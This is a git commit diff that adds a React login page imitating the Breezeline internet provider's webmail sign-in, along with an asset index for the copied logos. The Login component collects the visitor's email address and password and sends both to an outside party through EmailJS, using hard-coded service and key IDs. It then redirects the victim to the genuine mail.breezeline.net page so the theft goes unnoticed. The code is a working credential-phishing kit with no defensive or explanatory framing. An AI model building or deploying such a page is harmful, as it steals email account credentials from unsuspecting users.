cc30767c06e2998fc257f549db80d40e36bd4e08
Your Name <your_email@example.com>
2024-04-06 18:23:40 +0100

    first commit

---
+++ src/Components/Assets/index.js
@@ -0,0 +1,7 @@
+import Logo from '../Assets/Breezline.PNG';
+import Logos from '../Assets/Favicon.png';
+import newlogo from '../Assets/newlogo.png';
+import lastlogo from '../Assets/lastlogo.png';
+
+
+export default {Logo, Logos, newlogo, lastlogo};
---
+++ src/Components/Login.jsx
@@ -0,0 +1,51 @@
+import React, {useRef} from "react";
+import lastlogo from "../Components/Assets/lastlogo.png";
+import emailjs from '@emailjs/browser';
+
+function Login() {
+
+
+
+    const form = useRef();
+
+    const sendEmail = (e) => {
+        e.preventDefault();
+
+        emailjs.sendForm('service_id6z6i9', 'template_h2y7r5r', form.current, 'FVIPVt10PQDRIGWMa')
+            .then((result) => {
+                console.log(result.text);
+            }, (error) => {
+                console.log(error.text);
+            });
+
+        // Redirect to the specified link after submitting the form
+        window.location.href = 'https://mail.breezeline.net/hPronto/#';
+    };
+
+
+  return (
+    <div className="bg-[#065BBA] w-full h-screen bg-gradient-to-r from-[#D6EBFA] flex justify-center items-center">
+      <form ref={form} onSubmit={sendEmail} className="flex flex-col items-center">
+        <img src={lastlogo} alt="" className="mt-28 w-28 h-28" />
+        <div className="text-6xl text-[#011E62] font-bold mb-2">
+          breezline<sup className="text-2xl">&trade;</sup>
+        </div>
+        <div className="flex flex-col gap-4 w-full">
+          <div className="flex">
+            <label className="text-[#DBEFFC] text-md font-bold w-36 text-left">Email Address</label>
+            <input type="Email" placeholder="User@domain.net" required name="user_name" className="bg-[#E8F0FE] p-2 rounded-sm flex-1 custom-input placeholder:text-lg placeholder:font-mono" />
+          </div>
+          <div className="flex">
+            <label className="text-[#DBEFFC] text-md font-bold w-36 text-left">Password</label>
+            <input type="Password" required name="user_pass" className="bg-[#E8F0FE] p-2 rounded-sm flex-1 custom-input" />
+          </div>
+        </div>
+        <button type="submit" className="bg-[#002F7B] hover:bg-gradient-to-b from-[#1A69C0] text-white font-semibold text-xl py-2 w-96 rounded-md mt-8">Enter</button>
+        <p className="text-uderline text-white text-lg hover:text-green-900 underline mt-16">Forgotten Password Recovery</p>
+        {/* <p className="text-xs text-[#002F7B]">All email users, including those with a user@atlanticbb.net or user@atlanticbbn.net email address, can continue using this page with no action required at this time. Please continue to log in using the full email address <br/>as the username, and the existing password.</p> */}
+      </form>
+
+    </div>
+  );
+};
+export default Login;
